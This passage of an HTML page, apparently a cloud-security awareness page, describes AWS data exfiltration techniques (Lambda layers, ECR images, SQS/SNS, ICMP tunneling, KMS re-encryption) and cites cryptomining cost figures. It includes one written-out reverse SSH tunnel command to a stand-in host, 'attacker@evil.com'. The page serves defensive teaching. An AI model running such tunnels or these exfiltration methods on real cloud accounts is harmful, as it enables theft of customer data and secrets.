                    <div style="font-weight:bold; color:#975a16; margin-bottom:6px;">7Ô∏è‚É£ Lambda Layer Packaging</div>
                    <div style="font-size:0.9rem; color:#4a5568;">
                        Compromised Lambda bundles stolen data into a <strong>Lambda layer</strong> (up to 250MB), publishes it,
                        and grants attacker account permission to download the layer artifact.
                    </div>
                </div>

                <div style="background: white; border-radius: 12px; padding: 18px; border-left: 4px solid #dd6b20;">
                    <div style="font-weight:bold; color:#c05621; margin-bottom:6px;">8Ô∏è‚É£ ECR Image with Embedded Data</div>
                    <div style="font-size:0.9rem; color:#4a5568;">
                        Docker images pushed to ECR include <code>/data/dump.sql</code> or other secrets. Attacker pulls the image
                        from a shared repository and extracts the embedded data.
                    </div>
                </div>

                <div style="background: white; border-radius: 12px; padding: 18px; border-left: 4px solid #d69e2e;">
                    <div style="font-weight:bold; color:#975a16; margin-bottom:6px;">9Ô∏è‚É£ SQS/SNS Message Exfiltration</div>
                    <div style="font-size:0.9rem; color:#4a5568;">
                        Workloads send records to queues/topics in attacker accounts. Looks like normal messaging, but every
                        message carries customer data or secrets.
                    </div>
                </div>

                <div style="background: white; border-radius: 12px; padding: 18px; border-left: 4px solid #dd6b20;">
                    <div style="font-weight:bold; color:#c05621; margin-bottom:6px;">üîü SSH Reverse Tunneling</div>
                    <div style="font-size:0.9rem; color:#4a5568;">
                        From compromised EC2, create <strong>reverse SSH tunnels</strong> to attacker servers (e.g.
                        <code>ssh -R 8080:localhost:22 attacker@evil.com</code>) and stream arbitrary data through the tunnel.
                    </div>
                </div>

                <div style="background: white; border-radius: 12px; padding: 18px; border-left: 4px solid #d69e2e;">
                    <div style="font-weight:bold; color:#975a16; margin-bottom:6px;">1Ô∏è‚É£1Ô∏è‚É£ ICMP (Ping) Tunneling</div>
                    <div style="font-size:0.9rem; color:#4a5568;">
                        Encode base64 chunks of data into ICMP echo payloads. Each ping packet carries 48‚Äì56 bytes; hard to
                        notice without deep inspection of ICMP traffic.
                    </div>
                </div>

                <div style="background: white; border-radius: 12px; padding: 18px; border-left: 4px solid #e53e3e;">
                    <div style="font-weight:bold; color:#c53030; margin-bottom:6px;">1Ô∏è‚É£2Ô∏è‚É£ KMS Re‚Äëencryption Attack</div>
                    <div style="font-size:0.9rem; color:#4a5568;">
                        Over‚Äëprivileged KMS grants allow <strong>Decrypt + ReEncrypt*</strong>. Malware decrypts data and
                        re‚Äëencrypts to attacker CMKs in another account, completing exfiltration via KMS APIs.
                    </div>
                </div>
            </div>

            <div style="text-align:center; margin-top: 30px;">
                <a href="data_exfiltration_techniques.html" 
                   style="display:inline-block; padding: 12px 26px; border-radius: 999px; background: #c53030; color: white; text-decoration: none; font-weight: 600; box-shadow: 0 4px 10px rgba(0,0,0,0.2);">
                    üîé View Full Data Exfiltration Techniques Playbook (12 Methods)
                </a>
            </div>
        </div>

        <!-- COST IMPACT -->
        <div style="text-align: center; margin-top: 40px; padding: 30px; background: #f7fafc; border-radius: 12px;">
            <h3 style="color: #2d3748; font-size: 1.8rem; margin-bottom: 20px;">üí∞ Financial Impact</h3>
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; max-width: 1000px; margin: 20px auto;">
                <div>
                    <div style="font-size: 2rem; font-weight: bold; color: #c53030;">$53M</div>
                    <div style="color: #718096;">Stolen compute annually</div>
                </div>
                <div>
                    <div style="font-size: 2rem; font-weight: bold; color: #c53030;">$5K</div>
                    <div style="color: #718096;">Avg monthly crypto costs</div>
                </div>
                <div>
                    <div style="font-size: 2rem; font-weight: bold; color: #c53030;">156</div>
                    <div style="color: #718096;">Days before detection</div>
                </div>
                <div>
                    <div style="font-size: 2rem; font-weight: bold; color: #2f855a;">$200</div>
                    <div style="color: #718096;">Monthly prevention cost</div>
                </div>
            </div>
            <p style="margin-top: 25px; color: #4a5568; font-size: 1.1rem;">
                <strong>Prevention cost: ~$200/month (ECR scanning + GuardDuty)</strong><br/>
                Undetected cryptominer cost: $5K-20K/month + performance degradation
            </p>
        </div>
    </div>
</body>
</html>
